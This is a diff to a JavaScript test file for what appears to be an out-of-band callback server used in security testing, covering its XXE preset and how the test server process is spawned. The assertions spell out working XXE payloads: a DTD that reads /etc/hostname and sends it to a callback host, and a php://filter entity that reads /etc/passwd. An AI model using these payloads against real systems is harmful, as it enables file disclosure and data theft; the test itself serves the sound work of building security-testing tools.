@@ -114,7 +114,7 @@ test("rules: the XXE preset answers by path; everything else gets the default re
   assert.equal(dtd.body.toString(), `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kx0.${host}/d?d=%file;'>">\n%eval;\n%exfil;\n`);
   assert.equal(respond(rule, 1, req("https", "/fetch/k/kx6/x.dtd", `${ID}.${DOMAIN}`)).answer.part, "x.dtd", "HTTPS, tag in the path");
   assert.match(respond(rule, 1, req("http", "/feed.xml")).body.toString(), new RegExp(`<!DOCTYPE rss SYSTEM "http://kx8\\.${host.replace(/\./g, "\\.")}/x\\.dtd">`));
-  const data = respond(rule, 1, req("http", "/d?d=user", `kx0.${host}`));
+  const data = respond(rule, 1, req("http", "/d?d=hostname", `kx0.${host}`));
   assert.equal(data.answer.part, undefined);
   assert.match(data.body.toString(), /<html>/, "exfil lands on the default reply");
   assert.equal(xxeParts({ host, file: "php://filter/convert.base64-encode/resource=/etc/passwd" })["x.dtd"].body.split("\n")[0], `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`);
@@ -216,7 +216,7 @@ before(async () => {
   upHttps = fakeUpstream(true, cert).listen(ports.upHttps, "127.0.0.1");
   writeFileSync(join(dir, "rules.json"), JSON.stringify({ cids: [CID], rules: {} }));
   edge = spawn(process.execPath, [join(HERE, "..", "edge.mjs")], {
-    env: { ...process.env, COLLUDER_DATA: dir, COLLUDER_EDGE_HTTP: `127.0.0.1:${ports.http}`, COLLUDER_EDGE_HTTPS: `127.0.0.1:${ports.https}`,
+    env: { ...process.env, COLLUDER_CONFIG: join(dir, "none.yaml"), COLLUDER_DOMAIN: "oob.example", COLLUDER_DATA: dir, COLLUDER_EDGE_HTTP: `127.0.0.1:${ports.http}`, COLLUDER_EDGE_HTTPS: `127.0.0.1:${ports.https}`,
       COLLUDER_UPSTREAM_HTTP: `127.0.0.1:${ports.upHttp}`, COLLUDER_UPSTREAM_HTTPS: `127.0.0.1:${ports.upHttps}`,
       COLLUDER_EDGE_CERT: join(dir, "cert.pem"), COLLUDER_EDGE_KEY: join(dir, "key.pem") },
     stdio: ["ignore", "pipe", "inherit"],
